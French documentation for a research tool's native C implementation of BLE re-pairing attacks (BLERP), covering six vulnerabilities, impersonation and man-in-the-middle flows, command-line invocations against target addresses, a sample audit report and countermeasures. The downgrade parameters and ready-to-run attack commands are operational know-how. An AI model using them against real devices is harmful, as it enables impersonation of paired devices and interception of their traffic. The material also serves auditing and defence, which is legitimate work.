# Attaques BLERP : Re-Pairing BLE, Vulnérabilités V1-V6 et Implémentation Native

Ce document détaille l'intégration native complète en C de l'outillage et des attaques du papier de recherche **BLERP: BLE Re-Pairing Attacks and Defenses** (NDSS 2026) au sein du projet BLEURP.

---

## 1. Comprendre le problème : Le Re-Pairing BLE

Dans le protocole Bluetooth Low Energy (BLE), deux appareils qui se sont déjà associés partagent un secret à long terme appelé **LTK** (*Long Term Key*) ainsi qu'un niveau de sécurité négocié lors de l'appairage initial, noté **ARPK** (*Authenticated Requirements of Pairing Key*).

Lors des reconnexions habituelles, les appareils ne ré-exécutent pas tout le protocole d'appairage (SMP) : ils rétablissent directement une session chiffrée via la procédure *Link Layer Encryption*.

Cependant, la spécification Bluetooth autorise le **re-pairing** (ré-appairage) lorsqu'un appareil a perdu sa clé ou souhaite élever son niveau de sécurité. Les auteurs de BLERP ont découvert que **les implémentations majeures (iOS, Android, Linux, Windows, piles embarquées) n'authentifient pas correctement les demandes de re-pairing**, permettant à un attaquant de forcer un nouvel appairage affaibli et d'usurper l'un des participants.

```
    Légitime Central                                          Légitime Périphérique
         |                                                               |
         |<================ Session chiffrée (LTK) =====================>|
         |                                                               |
    Attaquant (PI)                                                       |
         |  (1) Usurpation d'adresse & d'annonces                       |
         |-------------------------------------------------------------->|
         |  (2) Rejet du chiffrement (LL_REJECT_IND)                     |
         |  (3) Re-pairing forcé avec paramètres affaiblis (Just Works)  |
         |  (4) Remplacement du bond : Clé connue de l'attaquant        |
```

---

## 2. Taxonomie des 6 Vulnérabilités (V1 à V6)

Le papier démontre 6 vulnérabilités distinctes dans les machines à états SMP et Link Layer :

| ID | Nom | Description | Impact |
|:---|:---|:---|:---|
| **V1** | *Unauthenticated Security Request* | La Central accepte une requête `Security Request` provenant d'un périphérique non authentifié et lance un re-pairing. | Déclenchement d'un re-pairing non sollicité par l'attaquant. |
| **V2** | *Unauthenticated Re-Pairing* | Le Périphérique accepte une `Pairing Request` sur une connexion déjà appairée sans exiger que la Central s'authentifie d'abord. | Usurpation immédiate de la Central (Central Impersonation). |
| **V3** | *Peripheral Security Downgrade* | Le Périphérique annonce un niveau de sécurité élevé (ex: MITM/SC), puis envoie une `Pairing Response` affaiblie. La Central accepte sans broncher. | Contournement des politiques de sécurité strictes. |
| **V4** | *Level Downgrade below ARPK* | Le re-pairing est accepté avec un niveau strictement inférieur à la clé déjà enregistrée (ex: abandon du MITM ou de SC pour Just Works). | Écoute et manipulation des données sans code PIN. |
| **V5** | *Session Interruption / Fallback* | L'attaquant rejette la demande de chiffrement (`LL_REJECT_IND`). Au lieu de couper la connexion, la victime bascule en re-pairing non authentifié. | Forçage systématique du ré-appairage. |
| **V6** | *Key Entropy Downgrade (KNOB)* | Lors du re-pairing, la taille de clé négociée est réduite au minimum légal de 7 octets (56 bits), voire avec des octets nuls. | Clé facilement cassable par force brute instantanée. |

---

## 3. Vecteurs d'Attaque Implémentés en C Natif

L'implémentation dans `src/smp_native/blerp_attack.c` fournit trois modes d'attaque autonomes et un mode d'audit complet via le canal HCI direct (`HCI_CHANNEL_USER`).

### 3.1 Peripheral Impersonation (PI)

L'attaquant se fait passer pour un périphérique légitime déjà connu de la victime (Central) :
1. Configure l'adaptateur HCI avec l'adresse MAC (RPA ou publique) et les annonces du périphérique légitime (nom, profil HID).
2. Attend que la Central victime s'y connecte automatiquement.
3. Lorsque la Central tente de réactiver le chiffrement avec l'ancienne clé, l'adaptateur envoie un rejet Link Layer (`HCI_OP_LE_LTK_NEG_REPLY` $\rightarrow$ `LL_REJECT_IND`) (V5).
4. La Central bascule en re-pairing et émet une `Pairing Request`.
5. L'attaquant répond avec des paramètres rétrogradés : `AuthReq = 0x01` (Just Works, pas de MITM, pas de SC) et `KeySize = 7` octets (V3, V4, V6).
6. L'attaquant mène le handshake SMP Phase 2 à terme (`Pairing Confirm`, `Pairing Random`) et calcule la clé dérivée **STK**.
7. Le bond stocké sur la Central est écrasé avec la clé contrôlée par l'attaquant.

```
Victime (Central)                                        BLEURP Attaquant (PI)
       |                                                           |
       |--------------- LE Create Connection --------------------->|
       |<-------------- Connection Complete (handle) --------------|
       |                                                           |
       |--- LL_ENC_REQ (demande de reprise avec ancien LTK) ------>|
       |<-- LL_REJECT_IND (Rejet de chiffrement : V5) -------------|
       |                                                           |
       |--- SMP Pairing Request (AuthReq=0x0D, KeySize=16) ------->|
       |<-- SMP Pairing Response (AuthReq=0x01, KeySize=7 : V4/V6)-|
       |                                                           |
       |<-- SMP Pairing Confirm (Mconfirm / Sconfirm) ------------>|
       |<-- SMP Pairing Random (Mrand / Srand) ------------------->|
       |                                                           |
       |       [ Clé STK calculée : bond écrasé sur la Central ]   |
```

### 3.2 Central Impersonation (CI)

L'attaquant cible un périphérique légitime appairé :
1. Configure l'adresse source pour usurper l'adresse de la Central légitime.
2. Établit la liaison Link Layer vers le périphérique.
3. Sans initier de session chiffrée, injecte immédiatement une trame SMP `Pairing Request` affaiblie (V2).
4. Si le périphérique est vulnérable, il répond par `Pairing Response` et valide le handshake Phase 2.
5. L'ancien appairage du périphérique est écrasé.

### 3.3 Active Man-in-the-Middle (MitM)

En utilisant deux interfaces Bluetooth (ex: `hci0` et `hci1`) :
- `hci0` joue le rôle de Périphérique vis-à-vis de la Central.
- `hci1` joue le rôle de Central vis-à-vis du Périphérique.
- Les trames SMP sont interceptées à la volée : le bit MITM (`0x04`) et le bit SC (`0x08`) sont masqués, et la taille de clé est ramenée à 7 octets.

---

## 4. Guide d'Utilisation en Ligne de Commande

Le binaire `bleurp` intègre la sous-commande `blerp` :

### 4.1 Peripheral Impersonation (PI)
```bash
# Attente de la connexion d'un smartphone appairé, rejet du chiffrement (V5) et rétrogradation à 7 octets (V6)
sudo ./build/bleurp blerp pi AA:BB:CC:DD:EE:FF -s 11:22:33:44:55:66 -n "MonClavier" -a 0x03C1 -e -k 7
```

### 4.2 Central Impersonation (CI)
```bash
# Injection d'un re-pairing affaibli vers un accessoire périphérique
sudo ./build/bleurp blerp ci 11:22:33:44:55:66 -s AA:BB:CC:DD:EE:FF -k 7 -r 0x01
```

### 4.3 Diagnostic et Audit Complet Automatisé (V1 à V6)
```bash
# Évaluation complète des 6 vulnérabilités avec matrice de verdict
sudo ./build/bleurp blerp audit AA:BB:CC:DD:EE:FF -t public -i 0
```

### 4.4 Pipeline Automatisé Option Finale (Scan 15s + Re-Pairing)
```bash
# Lancement du pipeline interactif automatisé Option Finale (scan 15s, validation de consentement, test re-pairing)
sudo ./build/bleurp blerp finale

# Évaluation automatique All-Test sur l'ensemble des cibles détectées
sudo ./build/bleurp blerp finale --all-test
```

Exemple de rapport généré :

```text
  ================================================================
            BLERP VULNERABILITY ASSESSMENT MATRIX (NDSS 2026)      
  ================================================================

  [BOND] Baseline Stored Level (ARPK) : Authenticated (MITM), 16 bytes key
  [+] Session Key Overwritten : STK derived (7 bytes)

  +----+--------------------------------------------------+-------------+
  | ID | Vulnerability Description                        | Verdict     |
  +----+--------------------------------------------------+-------------+
  | V1 | Central accepts unauthenticated Security Request | OUI         |
  | V2 | Peripheral accepts unauthenticated Pairing Req   | OUI         |
  | V3 | Peripheral requests high security then downgrades| OUI         |
  | V4 | Re-pairing proceeds below stored bond level      | OUI         |
  | V5 | Victim falls back to re-pairing after reject enc | OUI         |
  | V6 | Encryption key entropy reduced below stored bond | OUI         |
  +----+--------------------------------------------------+-------------+
```

---

## 5. Défenses et Contre-Mesures

Pour corriger ces vulnérabilités selon les préconisations du papier :

1. **Suppression du Fallback V5** : Si une demande de chiffrement échoue (`LL_REJECT_IND`), l'appareil doit immédiatement terminer la connexion et ne jamais accepter de re-pairing sur la même session sans intervention explicite de l'utilisateur.
2. **Contrôle Anti-Downgrade V4 / V6** : Si un bond existe avec `ARPK = Authenticated`, tout re-pairing demandant *Just Works* doit être rejeté (`Pairing Failed`, raison `0x03`). Si la taille de clé négociée est inférieure à celle du bond, rejeter avec la raison `0x06`.
3. **Authentification préalable du Re-Pairing (V2)** : Un périphérique ne doit jamais accepter de `Pairing Request` sur une adresse déjà appairée sans avoir au préalable authentifié la session courante avec la clé existante.
